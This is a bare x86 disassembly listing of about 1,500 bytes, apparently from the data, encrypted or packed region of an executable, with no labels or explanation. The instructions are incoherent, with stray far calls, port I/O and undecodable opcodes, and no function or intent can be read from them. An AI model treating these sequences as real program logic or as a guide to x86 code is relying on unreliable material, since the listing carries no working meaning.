  408e70:	sub    DWORD PTR [ebx],0xa3a47077
  408e76:	popf   
  408e77:	sbb    ah,bl
  408e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e7a:	and    BYTE PTR [ecx],0xc8
  408e7d:	call   0xca09:0x5466c9c8
  408e84:	test   eax,0x95e8f193
  408e89:	inc    esp
  408e8a:	imul   esi,DWORD PTR [ecx-0x30221379],0xffffffd9
  408e91:	pop    ss
  408e92:	aam    0x80
  408e94:	push   edi
  408e95:	retf   
  408e96:	lahf   
  408e97:	repz inc esi
  408e99:	inc    edi
  408e9a:	cmc    
  408e9b:	or     BYTE PTR [ebp+0x3e776178],cl
  408ea1:	jne    0x408e52
  408ea3:	sbb    eax,0x332ca33f
  408ea8:	cmp    eax,0xfcc7551b
  408ead:	adc    eax,0xc06c9530
  408eb2:	daa    
  408eb3:	fs sub al,0x31
  408eb6:	mul    BYTE PTR [ebx]
  408eb8:	inc    ebp
  408eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eba:	xchg   edx,eax
  408ebb:	sbb    DWORD PTR ds:[esi+0x2c],ebx
  408ebf:	or     esi,DWORD PTR [eax]
  408ec1:	add    DWORD PTR [eax],eax
  408ec3:	fistp  DWORD PTR [ecx]
  408ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ec6:	out    dx,al
  408ec7:	sbb    al,BYTE PTR [eax+ecx*8-0x63]
  408ecb:	int    0xde
  408ecd:	or     dl,BYTE PTR [ebp-0x2286c58e]
  408ed3:	es push esp
  408ed5:	test   al,0xa8
  408ed7:	and    ebp,esp
  408ed9:	add    al,0x71
  408edb:	imul   esi,edx,0x773d0757
  408ee1:	inc    ebx
  408ee2:	cmp    eax,0x775e8683
  408ee7:	dec    ecx
  408ee8:	jmp    0x408f35
  408eea:	xchg   edx,eax
  408eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eec:	sbb    eax,0x5f2fa6a4
  408ef1:	add    BYTE PTR [esi],0x51
  408ef4:	lock mov esp,0xed25b4a3
  408efa:	xchg   edi,eax
  408efb:	test   BYTE PTR [ebx-0x19],0x6c
  408eff:	scas   eax,DWORD PTR es:[edi]
  408f00:	jno    0x408f05
  408f02:	arpl   WORD PTR [eiz*4-0x44bc0f50],bx
  408f09:	je     0x408f50
  408f0b:	fwait
  408f0c:	adc    al,0xcf
  408f0e:	adc    DWORD PTR [edi-0x1b25a3d1],edi
  408f14:	sahf   
  408f15:	ins    DWORD PTR es:[edi],dx
  408f16:	(bad)
  408f1a:	mov    esp,DWORD PTR [eax-0x25d1743f]
  408f20:	retf   
  408f21:	ins    BYTE PTR es:[edi],dx
  408f22:	add    esi,0xc61706b8
  408f28:	mov    ebx,0x678c4a0b
  408f2d:	and    DWORD PTR [ebx],edi
  408f2f:	add    al,0xc2
  408f31:	out    0x5c,eax
  408f33:	(bad)  
  408f34:	cmp    dl,BYTE PTR [edx]
  408f36:	into   
  408f37:	and    eax,0x9fda1c06
  408f3c:	mov    ebx,0xe52c48fe
  408f41:	in     al,dx
  408f42:	sbb    cl,BYTE PTR [esp+eax*4-0x68eab2a5]
  408f49:	jl     0x408f26
  408f4b:	fsubr  st(2),st
  408f4d:	sbb    bl,BYTE PTR [esi+0xb]
  408f50:	push   esp
  408f51:	ret    0x2f80
  408f54:	push   edx
  408f55:	sub    BYTE PTR [esi+edi*1-0x17de6d31],dh
  408f5c:	inc    edx
  408f5d:	pop    ebp
  408f5e:	xchg   ecx,eax
  408f5f:	aam    0x14
  408f61:	mov    ebx,DWORD PTR [edi-0x52]
  408f64:	stc    
  408f65:	mov    al,ds:0x38493b60
  408f6a:	nop
  408f6b:	push   ds
  408f6c:	inc    ebx
  408f6d:	pop    es
  408f6e:	mov    ch,0xad
  408f70:	xchg   edi,eax
  408f71:	mov    bh,BYTE PTR [esp+ebp*2+0x3c81e936]
  408f78:	repz sbb BYTE PTR [esi-0x78],0xd1
  408f7d:	mov    ecx,0x81a9e93b
  408f82:	mov    eax,DWORD PTR [edi-0xd6fdcbe]
  408f88:	test   DWORD PTR [ebx+0x2cfe119d],0x8a21696c
  408f92:	ret    0x5253
  408f95:	inc    ebx
  408f96:	and    eax,0xd7b515f
  408f9b:	loope  0x408f5d
  408f9d:	retf   0x9fc9
  408fa0:	jle    0x408ff3
  408fa2:	pop    ebx
  408fa3:	repz in al,0x35
  408fa6:	jle    0x409009
  408fa8:	leave  
  408fa9:	dec    ecx
  408faa:	xlat   BYTE PTR ds:[ebx]
  408fab:	sub    eax,0xfb7a875
  408fb0:	out    0xf5,eax
  408fb2:	xchg   edi,eax
  408fb3:	sbb    eax,0x8a155ef
  408fb8:	add    al,0x22
  408fba:	sahf   
  408fbb:	daa    
  408fbc:	sti    
  408fbd:	lods   al,BYTE PTR ds:[esi]
  408fbe:	addr16 (bad) 
  408fc0:	les    edx,FWORD PTR [edx+0x35]
  408fc3:	jle    0x408f85
  408fc5:	pop    ds
  408fc6:	inc    edx
  408fc7:	sub    dh,bl
  408fc9:	jl     0x409034
  408fcb:	in     eax,dx
  408fcc:	lock lods eax,DWORD PTR ds:[esi]
  408fce:	xor    DWORD PTR [ebx-0x59],esi
  408fd1:	xchg   ch,ah
  408fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fd4:	into   
  408fd5:	lods   al,BYTE PTR ds:[esi]
  408fd6:	fwait
  408fd7:	call   0x64ed:0x42508fa
  408fde:	jmp    0x74b4:0x9949c04a
  408fe5:	addr16 jmp 0x67b7dcca
  408feb:	jle    0x408f9f
  408fed:	retf   
  408fee:	les    edi,FWORD PTR [edx]
  408ff0:	es add eax,0xfc6b9972
  408ff6:	popf   
  408ff7:	outs   dx,BYTE PTR ds:[esi]
  408ff8:	arpl   WORD PTR [ecx-0x2ce15c06],cx
  408ffe:	inc    esi
  408fff:	xchg   ebp,eax
  409000:	and    bh,BYTE PTR [edx+edi*8-0x255c3abe]
  409007:	adc    DWORD PTR [edx],0x6c
  40900a:	adc    DWORD PTR [eax-0xb],esi
  40900d:	pop    ss
  40900e:	push   ss
  40900f:	jecxz  0x408fc6
  409011:	mov    dh,0xf3
  409013:	out    0x6b,al
  409015:	gs jno 0x409038
  409018:	popf   
  409019:	loopne 0x408fb6
  40901b:	popa   
  40901c:	xor    al,0x21
  40901e:	xor    al,0x9a
  409020:	loopne 0x40907e
  409022:	call   FWORD PTR [eax+edx*4]
  409025:	mov    ecx,0x9365d216
  40902a:	imul   edx,DWORD PTR [edx-0x59],0xffffffd4
  40902e:	clc    
  40902f:	arpl   bp,bp
  409031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409032:	dec    esp
  409033:	cmp    ecx,0x9ddabdd4
  409039:	add    BYTE PTR [edi+0x3012b0a7],0x8c
  409040:	sub    eax,0xc9eff438
  409045:	add    BYTE PTR [ecx+0x2e5f5015],al
  40904b:	cwde   
  40904c:	imul   ebx,ecx,0x43
  40904f:	ins    BYTE PTR es:[edi],dx
  409050:	xchg   edi,eax
  409051:	mov    dh,BYTE PTR [eax-0x3682ff98]
  409057:	cld    
  409058:	cmp    DWORD PTR ds:0x6d9a821c,esp
  40905e:	jae    0x409077
  409060:	dec    esp
  409061:	ret    0x306
  409064:	cmp    DWORD PTR [edx+0x41],ebx
  409067:	jge    0x40902a
  409069:	mov    edi,ebp
  40906b:	adc    BYTE PTR [esi-0x9d51dcf],bl
  409071:	sbb    eax,0xe99c8384
  409076:	test   al,0xc
  409078:	jle    0x4090a9
  40907a:	add    BYTE PTR [edx+eax*2+0x47],al
  40907e:	xchg   edx,eax
  40907f:	pop    sp
  409081:	add    BYTE PTR [ecx-0x3d],bh
  409084:	lahf   
  409085:	das    
  409086:	out    0x89,al
  409088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409089:	xchg   ebx,eax
  40908a:	stos   DWORD PTR es:[edi],eax
  40908b:	pop    ss
  40908c:	inc    ebp
  40908d:	call   0x4a1c:0x7f7a9e33
  409094:	ret    0xb0ed
  409097:	inc    edi
  409098:	push   esi
  409099:	mov    edx,0xfa2d84be
  40909e:	dec    ebp
  40909f:	or     BYTE PTR [edi+0x2649532e],dh
  4090a5:	adc    cl,BYTE PTR [edi]
  4090a7:	push   esi
  4090a8:	rol    DWORD PTR [ebx+ebx*8-0x64],0x2c
  4090ad:	sti    
  4090ae:	push   0x1
  4090b0:	pop    es
  4090b1:	lods   al,BYTE PTR ds:[esi]
  4090b2:	enter  0x944,0x79
  4090b6:	leave  
  4090b7:	jmp    0xc54:0x83341941
  4090be:	stos   DWORD PTR es:[edi],eax
  4090bf:	jmp    FWORD PTR [esi]
  4090c1:	push   ebx
  4090c2:	sbb    ch,dl
  4090c4:	out    0xfe,al
  4090c6:	jbe    0x409100
  4090c8:	loop   0x409102
  4090ca:	mov    ds:0x595d9592,eax
  4090cf:	sar    bl,0x52
  4090d2:	ret    0x2b33
  4090d5:	rcl    esi,cl
  4090d7:	icebp  
  4090d8:	add    BYTE PTR [eax],0x41
  4090db:	sbb    ch,0x82
  4090de:	sbb    esp,0xffffffd2
  4090e1:	jo     0x4090d5
  4090e3:	jne    0x40915c
  4090e5:	ror    bl,0xee
  4090e8:	cmp    esi,ebp
  4090ea:	xchg   esi,eax
  4090eb:	fld    QWORD PTR [edx-0x8]
  4090ee:	ret    
  4090ef:	cli    
  4090f0:	mov    al,ds:0xb2ecc786
  4090f5:	imul   DWORD PTR [ecx-0xb]
  4090f8:	sbb    eax,0xe235ac6b
  4090fd:	inc    esp
  4090fe:	pop    ss
  4090ff:	cld    
  409100:	mov    eax,DWORD PTR [ebx]
  409102:	int3   
  409103:	sahf   
  409104:	test   dl,0x5d
  409107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409108:	push   esi
  40910a:	loopne 0x40913e
  40910c:	lods   al,BYTE PTR ds:[esi]
  40910d:	push   0xafbdbd01
  409112:	adc    esp,0xffffff95
  409115:	jnp    0x40911e
  409117:	xchg   ebp,eax
  409118:	retf   0xe0d2
  40911b:	mov    si,0x2771
  40911f:	das    
  409120:	push   eax
  409121:	push   edx
  409122:	test   eax,0x114b7b31
  409127:	test   BYTE PTR [esi-0x61b17394],ch
  40912d:	into   
  40912e:	int    0x80
  409130:	pop    edx
  409131:	mov    cl,0x8c
  409133:	call   0xa4a10a41
  409138:	inc    ebx
  409139:	(bad)  
  40913a:	cmc    
  40913b:	call   0xe246:0xd45f176c
  409142:	call   0xba0a:0x76dbf5ee
  409149:	iret   
  40914a:	dec    esp
  40914b:	mov    al,0xf3
  40914d:	jl     0x4090d0
  40914f:	arpl   sp,dx
  409151:	add    ah,bl
  409153:	and    al,0xf8
  409155:	jnp    0x409142
  409157:	dec    ebx
  409158:	je     0x40919c
  40915a:	jecxz  0x4090eb
  40915c:	ret    
  40915d:	outs   dx,DWORD PTR ds:[esi]
  40915e:	ins    BYTE PTR es:[edi],dx
  40915f:	pop    ebp
  409160:	xor    eax,0xc97e573d
  409165:	sti    
  409166:	iret   
  409167:	cld    
  409168:	pusha  
  409169:	mov    edx,0x5491f8b9
  40916e:	rcr    DWORD PTR [eax+0x1e],cl
  409171:	gs neg ecx
  409174:	mov    esi,DWORD PTR [edx+0x1c]
  409177:	xchg   esp,eax
  409178:	pop    ecx
  409179:	loopne 0x409114
  40917b:	xchg   edx,eax
  40917c:	jns    0x409198
  40917e:	mov    dl,0x84
  409180:	loopne 0x4091ec
  409182:	mov    ebp,0xf7ace07
  409187:	sub    al,0xfb
  409189:	aas    
  40918a:	cmp    ebp,DWORD PTR [ebp+eax*4-0x34390aa2]
  409191:	inc    esi
  409192:	mov    dl,0x85
  409194:	cmc    
  409195:	lods   al,BYTE PTR ds:[esi]
  409196:	pop    ecx
  409197:	mov    al,0xaf
  409199:	(bad)  
  40919a:	or     BYTE PTR [edx],al
  40919c:	out    dx,al
  40919d:	xchg   edx,eax
  40919e:	mov    BYTE PTR [ebp-0x4b],dh
  4091a1:	rol    BYTE PTR [ebx-0x5a],cl
  4091a4:	jp     0x4091d6
  4091a6:	inc    edx
  4091a7:	mov    ebx,eax
  4091a9:	les    eax,FWORD PTR [ebp-0x3389e1cc]
  4091af:	adc    dh,BYTE PTR [ebx]
  4091b1:	add    eax,0xd6c112e6
  4091b6:	sbb    esp,ebp
  4091b8:	dec    esp
  4091b9:	push   edi
  4091ba:	adc    eax,0xcaa296e3
  4091bf:	popf   
  4091c0:	sahf   
  4091c1:	xor    cl,BYTE PTR [ebp-0x76]
  4091c4:	add    eax,0x8843b224
  4091c9:	hlt    
  4091ca:	outs   dx,BYTE PTR ds:[esi]
  4091cb:	fwait
  4091cc:	cmp    al,0x99
  4091ce:	test   eax,0x94eb497c
  4091d3:	push   edx
  4091d4:	outs   dx,BYTE PTR ds:[esi]
  4091d5:	adc    esi,ecx
  4091d7:	popa   
  4091d8:	ror    BYTE PTR [ebx+0x16],cl
  4091db:	xor    ch,BYTE PTR [edx]
  4091dd:	int    0xb4
  4091df:	fdiv   DWORD PTR [eax+0x57]
  4091e2:	push   0x2b
  4091e4:	push   fs
  4091e6:	sub    al,BYTE PTR [ebx]
  4091e8:	outs   dx,BYTE PTR ds:[esi]
  4091e9:	popf   
  4091ea:	xchg   ecx,eax
  4091eb:	mov    DWORD PTR es:[ebx],ebp
  4091ee:	add    BYTE PTR [eax],dh
  4091f0:	out    0xab,al
  4091f2:	scas   eax,DWORD PTR es:[edi]
  4091f3:	push   es
  4091f4:	cmp    BYTE PTR [eax],bl
  4091f6:	data16 jnp 0x4091b6
  4091f9:	inc    edx
  4091fa:	in     al,0x2d
  4091fc:	adc    BYTE PTR [eax+0x797b1ec4],dh
  409202:	add    BYTE PTR [ecx+0x2dd7a714],dl
  409208:	adc    BYTE PTR [edi-0x80],ah
  40920b:	(bad)  
  40920c:	mov    esi,0x9633ce6b
  409211:	or     ebx,ebp
  409213:	leave  
  409214:	inc    ecx
  409215:	sbb    eax,0xc5eff7bc
  40921a:	adc    BYTE PTR [edx+0x24f20455],0x7e
  409221:	push   cs
  409222:	sub    BYTE PTR ds:0xb6ba9b5,ah
  409228:	add    DWORD PTR [esi-0x75],0x1548257e
  40922f:	and    esp,DWORD PTR [edx+0x51]
  409232:	dec    ebx
  409233:	ds arpl sp,di
  409236:	sub    edx,esp
  409238:	das    
  409239:	inc    ebx
  40923a:	out    dx,al
  40923b:	mov    DWORD PTR ss:[ebx+0x48],esp
  40923f:	in     al,0x41
  409241:	pop    es
  409242:	jno    0x4092bf
  409244:	add    edx,esi
  409246:	pop    es
  409247:	lahf   
  409248:	fcmovu st,st(7)
  40924a:	in     al,0xe7
  40924c:	jg     0x409283
  40924e:	cdq    
  40924f:	push   esp
  409250:	jecxz  0x409269
  409252:	loop   0x409276
  409254:	inc    eax
  409255:	add    bl,dl
  409257:	(bad)  
  409258:	pop    esp
  409259:	xchg   edi,eax
  40925a:	push   edi
  40925b:	push   ebx
  40925c:	das    
  40925d:	xchg   BYTE PTR [ecx+0x5d5d0fc2],ch
  409263:	push   ebx
  409264:	cmp    DWORD PTR [ecx+0x5b],eax
  409267:	mov    esp,0xfbeb8e6
  40926c:	cdq    
  40926d:	mov    dl,0x61
  40926f:	inc    esp
  409270:	xor    dl,BYTE PTR [eax+0x2e10de1a]
  409276:	call   0x423a9e
  40927b:	jmp    0x409786
  409280:	retf   0x3e3d
  409283:	into   
  409284:	leave  
  409285:	int    0xda
  409287:	fldenv [esi+0x50a228f9]
  40928d:	mov    DWORD PTR [eax+eax*8+0x3a],0x6a7878f5
  409295:	jl     0x40930f
  409297:	js     0x409236
  409299:	or     eax,0x51bb8d49
  40929e:	and    al,0x4a
  4092a0:	jne    0x409304
  4092a2:	cmp    al,0x27
  4092a4:	sbb    bl,al
  4092a6:	cdq    
  4092a7:	push   cs
  4092a8:	mov    ah,0x23
  4092aa:	mov    dh,0xa1
  4092ac:	adc    dl,BYTE PTR [ebx]
  4092ae:	cmp    cl,BYTE PTR [ebp+0x32c297b5]
  4092b4:	adc    DWORD PTR [edx+0x54],eax
  4092b7:	ds sahf 
  4092b9:	popa   
  4092ba:	inc    edi
  4092bb:	or     al,dl
  4092bd:	retf   
  4092be:	xor    eax,0xf84c2b34
  4092c3:	sbb    al,0xd4
  4092c5:	pop    ecx
  4092c6:	mov    ah,0x9a
  4092c8:	dec    ecx
  4092c9:	fistp  QWORD PTR [esi]
  4092cb:	mov    ebp,0xaa6ac264
  4092d0:	pop    edi
  4092d1:	mov    bh,0x9a
  4092d3:	out    0x74,eax
  4092d5:	xor    ebp,esi
  4092d7:	jnp    0x409355
  4092d9:	jae    0x409304
  4092db:	jmp    0x966:0xd6ef58ad
  4092e2:	iret   
  4092e3:	push   edx
  4092e4:	mov    al,0xd7
  4092e6:	and    edx,0x21
  4092e9:	adc    bh,BYTE PTR [edx]
  4092eb:	lahf   
  4092ec:	ret    0xbac1
  4092ef:	or     DWORD PTR [eax-0x43],edx
  4092f2:	jnp    0x409306
  4092f4:	sbb    ecx,DWORD PTR ds:0x971e6cab
  4092fa:	dec    edi
  4092fb:	pop    edx
  4092fc:	and    esi,DWORD PTR [esi-0x7a0fa0a0]
  409302:	test   eax,0xef0bab6a
  409307:	pop    es
  409308:	pop    edx
  409309:	mov    ebx,0x5d640274
  40930e:	xor    BYTE PTR [edi+0x1b],ch
  409311:	and    al,BYTE PTR [esi]
  409313:	xchg   DWORD PTR [eax+edx*8+0x38],esi
  409317:	sub    dh,ch
  409319:	push   esp
  40931a:	add    esp,DWORD PTR [edi]
  40931c:	pop    esp
  40931d:	cs cmc 
  40931f:	jno    0x40932e
  409321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409322:	inc    eax
  409323:	pusha  
  409324:	retf   
  409325:	mov    ch,bh
  409327:	xchg   ebx,eax
  409328:	mov    bl,0xa6
  40932a:	lods   al,BYTE PTR ds:[esi]
  40932b:	and    al,0xa7
  40932d:	mov    eax,ds:0x15d90749
  409332:	repz jnp 0x40934e
  409335:	out    dx,eax
  409336:	mov    dl,0x7d
  409338:	xor    al,0x9c
  40933a:	pusha  
  40933b:	sbb    DWORD PTR [ebx-0x40826821],esi
  409341:	cli    
  409342:	and    al,BYTE PTR [esp+ecx*2]
  409345:	jnp    0x409355
  409347:	aam    0x30
  409349:	or     bh,al
  40934b:	sub    ch,BYTE PTR [ecx+0xf4c71d4]
  409351:	xchg   esi,eax
  409352:	out    0xb3,al
  409354:	mov    ds:0x7a6ed74d,eax
  409359:	mov    ecx,ss
  40935b:	sbb    al,0x62
  40935d:	aas    
  40935e:	push   edx
  40935f:	mov    dh,0x1b
  409361:	cs sub eax,esp
  409364:	std    
  409365:	add    BYTE PTR [eax+0x22],dl
  409368:	jmp    0x40934a
  40936a:	outs   dx,DWORD PTR ds:[esi]
  40936b:	test   DWORD PTR [edx-0x6c],esp
  40936e:	mov    dh,0x84
  409370:	dec    ebp
  409371:	les    ecx,FWORD PTR [edi+0x4dc3bb43]
  409377:	adc    al,dh
  409379:	sahf   
  40937a:	scas   al,BYTE PTR es:[edi]
  40937b:	aaa    
  40937c:	stc    
  40937d:	jbe    0x40934a
  40937f:	nop
  409380:	sub    bl,al
  409382:	adc    BYTE PTR [esp+eax*2+0x70],0x66
  409387:	stos   DWORD PTR es:[edi],eax
  409388:	pop    ebx
  409389:	int    0x28
  40938b:	adc    al,0xa5
  40938d:	imul   BYTE PTR [eax-0x1e]
  409390:	sbb    BYTE PTR [ebp-0x79],bh
  409393:	mov    cl,0x10
  409395:	jmp    0x5f31:0x9eba1eb2
  40939c:	mov    ds:0xc5d04a6,al
  4093a1:	jecxz  0x4093a3
  4093a3:	int3   
  4093a4:	and    eax,0x76b4835b
  4093a9:	pop    ss
  4093aa:	xchg   edx,eax
  4093ab:	adc    ah,0x5d
  4093ae:	scas   eax,DWORD PTR es:[edi]
  4093af:	in     al,0x5f
  4093b1:	gs dec ecx
  4093b3:	pop    eax
  4093b4:	xchg   ebx,eax
  4093b5:	cmp    eax,DWORD PTR [eax]
  4093b7:	nop
  4093b8:	je     0x409366
  4093ba:	pop    edi
  4093bb:	dec    ecx
  4093bc:	ins    DWORD PTR es:[edi],dx
  4093bd:	addr16 mov ch,0xc6
  4093c0:	rcr    dl,cl
  4093c2:	and    edx,eax
  4093c4:	cmp    DWORD PTR [ebp-0x32],0xffffffd7
  4093c8:	and    BYTE PTR [ecx-0x75ad91c8],ch
  4093ce:	xor    eax,0xf2574660
  4093d3:	or     al,0x66
  4093d5:	sbb    DWORD PTR [ebp*1-0x68c6cd0e],ebp
  4093dc:	inc    edi
  4093dd:	xlat   BYTE PTR ds:[ebx]
  4093de:	adc    edi,esp
  4093e0:	cdq    
  4093e1:	jmp    0x30e2aa9e
  4093e6:	inc    esp
  4093e7:	jbe    0x409406
  4093e9:	jnp    0x409457
  4093eb:	sub    cl,ch
  4093ed:	ret    0xe9bf
  4093f0:	mov    ds:0x4330c88c,eax
  4093f5:	inc    edi
  4093f6:	stos   DWORD PTR es:[edi],eax
  4093f7:	jbe    0x4093dc
  4093f9:	cmp    eax,0xe361360b
  4093fe:	cwde   
  4093ff:	cdq    
  409400:	stc    
  409401:	mov    ah,0xcb
  409403:	aaa    
  409404:	lock test al,0x1
  409407:	dec    ecx
  409408:	jo     0x409434
  40940a:	rcl    DWORD PTR fs:[eax+0x6002640e],1
  409411:	push   edx
  409412:	(bad)  
  409413:	fwait
  409414:	inc    edi
  409415:	or     DWORD PTR [edi],edi
  409417:	jge    0x4093c5
  409419:	into   
  40941a:	or     edx,esp
  40941c:	lahf   
  40941d:	adc    eax,0x16b85cc4
  409422:	dec    esp
  409423:	pop    esp
  409424:	call   0xb23b:0xe1ccd3c6
  40942b:	and    DWORD PTR [esi+0x5deb162e],edx
  409431:	push   ebx
  409432:	xchg   esi,eax
  409433:	test   edi,0x5a337e38
  409439:	lds    esp,FWORD PTR [edx]
  40943b:	add    BYTE PTR [esi*4+0x6e33146e],ah
  409442:	popa   
  409443:	outs   dx,BYTE PTR ds:[esi]
  409444:	call   0x65b1:0x1b448723
  40944b:	retf   0x1afd
  40944e:	jno    0x40949a
  409450:	cmp    BYTE PTR [ecx+eax*1],cl
  409453:	xchg   DWORD PTR [esp+eiz*4-0xd],eax
  409457:	addr16 push ebx
  409459:	jbe    0x4093e9
  40945b:	pop    esi
  40945c:	jnp    0x409490
  40945e:	mov    WORD PTR [edx+edx*2+0x1d],?
  409462:	bound  eax,QWORD PTR [eax-0xe]
  409465:	jle    0x409406
  409467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409468:	cmp    al,0x16
  40946a:	test   eax,0x923c9aa9
  40946f:	iret   
  409470:	jp     0x4094d7
  409472:	cmp    bh,BYTE PTR [edi+0x21]
  409475:	push   es
  409476:	dec    esp
  409477:	sbb    eax,0x87f9067d
  40947c:	jnp    0x409471
  40947e:	jae    0x40941c
  409480:	or     BYTE PTR [ebp+0x27932132],cl
  409486:	fbld   TBYTE PTR ds:0xae1e30f2
  40948c:	push   ebx
  40948d:	sbb    bl,dh
  40948f:	shl    BYTE PTR [esi+esi*8-0x7f],1
  409493:	adc    al,0x1
  409495:	call   0x98e4:0x74bb967f
  40949c:	out    0x9,eax
  40949e:	jne    0x40943c
  4094a0:	jmp    0x3e1a3e62
  4094a5:	ficomp DWORD PTR [edx+eiz*4-0x32]
  4094a9:	test   ch,bl
  4094ab:	sti    
  4094ac:	or     ecx,DWORD PTR [eax+0x337055dd]
  4094b2:	xchg   dh,ch
  4094b4:	(bad)  
  4094b5:	cmp    eax,0xa111a807
  4094ba:	std    
  4094bb:	adc    eax,0x54cfb9d8
  4094c0:	push   ss
  4094c1:	jnp    0x409492
  4094c3:	mov    ecx,0xf217e508
  4094c8:	pop    esp
  4094c9:	push   ds
  4094ca:	out    0x70,eax
  4094cc:	jecxz  0x409530
  4094ce:	xchg   edx,eax
  4094cf:	cmp    ecx,DWORD PTR [eax]
  4094d1:	adc    BYTE PTR [eax+0x7274a51],0x66
  4094d8:	xchg   DWORD PTR [ebp-0x40],ecx
  4094db:	add    BYTE PTR [edx],dl
  4094dd:	mov    WORD PTR [esi+0x2e],?
  4094e0:	push   edx
  4094e1:	(bad)  
  4094e2:	test   DWORD PTR [edi],0xa3a75ebd
  4094e8:	jo     0x40951a
  4094ea:	fadd   st(3),st
  4094ec:	push   esi
  4094ed:	outs   dx,DWORD PTR ds:[esi]
  4094ee:	out    0x70,eax
  4094f0:	push   0xfffffff9
  4094f2:	pop    esp
  4094f3:	gs xchg bp,ax
  4094f6:	xchg   esi,eax
  4094f7:	xchg   esi,eax
  4094f8:	dec    edi
  4094f9:	loop   0x409536
  4094fb:	out    0x95,eax
  4094fd:	push   esi
  4094fe:	in     al,dx
  4094ff:	push   eax
  409500:	cdq    
  409501:	repnz and al,0x24
  409504:	and    eax,0x9ca28d59
  409509:	jp     0x4094c0
  40950b:	sub    al,0x55
  40950d:	es je  0x409537
  409510:	xor    al,0xbd
  409512:	mov    dl,0x25
  409514:	arpl   WORD PTR [ebx+0x611f1098],ax
  40951a:	push   ds
  40951b:	adc    eax,0x3f1e3241
  409520:	out    dx,eax
  409521:	and    ah,cl
  409523:	dec    ecx
  409524:	ins    BYTE PTR es:[edi],dx
  409525:	mov    dh,0xfc
  409527:	je     0x409589
  409529:	mov    ch,0x10
  40952b:	jo     0x4094c2
  40952d:	jecxz  0x4094f6
  40952f:	jge    0x409578
  409531:	repz xchg ebx,eax
  409533:	fadd   st(1),st
  409535:	stos   DWORD PTR es:[edi],eax
  409536:	xchg   esi,eax
  409537:	fdivp  st(5),st
  409539:	retf   0xbfa9
  40953c:	dec    edi
  40953d:	xchg   ebp,esp
  40953f:	(bad)  
  409540:	add    ebx,edx
  409542:	popa   
  409543:	(bad)  
  409545:	(bad)  
  409546:	sar    BYTE PTR [eax+edx*4+0x2f1d9f3b],0x97
  40954e:	or     esp,DWORD PTR [esi-0x6e]
  409551:	(bad)  
  409552:	scas   eax,DWORD PTR es:[edi]
  409553:	sar    BYTE PTR [edx+0x569677bf],0xd0
  40955a:	push   eax
  40955b:	test   BYTE PTR [eax-0x6274925e],cl
  409561:	cli    
  409562:	and    cl,BYTE PTR [edi-0x32bade8d]
  409568:	stos   BYTE PTR es:[edi],al
  409569:	cdq    
  40956a:	shr    esi,0x30
  40956d:	sbb    al,BYTE PTR [edx]
  40956f:	mov    BYTE PTR [ecx],ah
  409571:	push   edx
  409572:	ret    
  409573:	repnz pop esi
  409575:	pop    ebp
  409576:	imul   dh
  409578:	call   0x1680:0xf6ba295a
  40957f:	jp     0x40955f
  409581:	lahf   
  409582:	mov    edx,0x9dd94b30
  409587:	jb     0x409552
  409589:	cmp    BYTE PTR [edi+0x26],0xe2
  40958d:	fxch   st(0)
  40958f:	inc    ebp
  409590:	popf   
  409591:	lock dec ebp
  409593:	inc    edx
  409594:	xchg   BYTE PTR [edx-0x19],dl
  409597:	or     ah,0xb0
  40959a:	sbb    DWORD PTR [esi],0x5bcc70cf
  4095a0:	outs   dx,DWORD PTR ds:[esi]
  4095a1:	pusha  
  4095a2:	adc    eax,0xf4e8e141
  4095a7:	sub    ecx,DWORD PTR [ebx]
  4095a9:	push   es
  4095aa:	mov    ebx,0xc2cde42d
  4095af:	data16 and BYTE PTR [ebx-0x2dede1c5],dh
  4095b6:	sar    edx,0x13
  4095b9:	jmp    0x40956c
  4095bb:	pop    esi
  4095bc:	call   ebp
  4095be:	out    dx,al
  4095bf:	shl    bl,1
  4095c1:	adc    esi,DWORD PTR [edi+0x5af8b346]
  4095c7:	lods   eax,DWORD PTR ds:[esi]
  4095c8:	inc    ecx
  4095c9:	push   ebx
  4095ca:	iret   
  4095cb:	xor    ecx,0x3f454016
  4095d1:	inc    eax
  4095d2:	and    edx,DWORD PTR [ebp+0x4a2c6c09]
  4095d8:	xor    BYTE PTR ds:0x9069890f,al
  4095de:	and    eax,ecx
  4095e0:	jnp    0x409569
  4095e2:	hlt    
  4095e3:	adc    BYTE PTR ds:0xe2bb91db,dh
  4095e9:	and    eax,0x760bbb21
  4095ee:	cmp    al,dh
  4095f0:	sbb    eax,0x7490662c
  4095f5:	call   0x5aef:0xd8c41d03
  4095fc:	jb     0x4095c4
  4095fe:	inc    edi
  4095ff:	fmul   DWORD PTR [esi-0x1e]
  409602:	arpl   di,dx
  409604:	inc    cl
  409606:	push   ecx
  409607:	push   edi
  409608:	setb   BYTE PTR [esi+0x75f68791]
  40960f:	inc    esi
  409610:	xchg   DWORD PTR [ecx+0x3306d4f6],esi
  409616:	cs dec edi
  409618:	sbb    BYTE PTR [ecx-0x77f7f94a],al
  40961e:	ret    0x252e
  409621:	xor    esp,DWORD PTR [esi+0x4dd1b2a]
  409627:	cs pop esp
  409629:	leave  
  40962a:	jb     0x40968d
  40962c:	pop    ebx
  40962d:	or     eax,0x1ff62467
  409632:	in     al,0xc1
  409634:	xor    dh,bh
  409636:	ror    ebp,1
  409638:	out    0x14,al
  40963a:	jae    0x40960d
  40963c:	cdq    
  40963d:	inc    esp
  40963e:	sbb    BYTE PTR [edx],ah
  409640:	pop    ecx
  409641:	mov    ds:0xcf3b8f1,eax
  409646:	sub    eax,0x77311f0c
  40964b:	add    DWORD PTR [ebx-0x27],ebp
  40964e:	arpl   WORD PTR [eax-0x5a],cx
  409651:	addr16 jns 0x409656
  409654:	fisub  WORD PTR [eax+ebx*1+0x66676e82]
  40965b:	aas    
  40965c:	into   
  40965d:	sti    
  40965e:	mov    bh,0x44
  409660:	cmovo  edi,DWORD PTR [edi*8-0x27369c40]
  409668:	shr    BYTE PTR [ebx],0x20
  40966b:	mov    ds:0x626404ba,al
  409670:	retf   0x5add
  409673:	push   cs
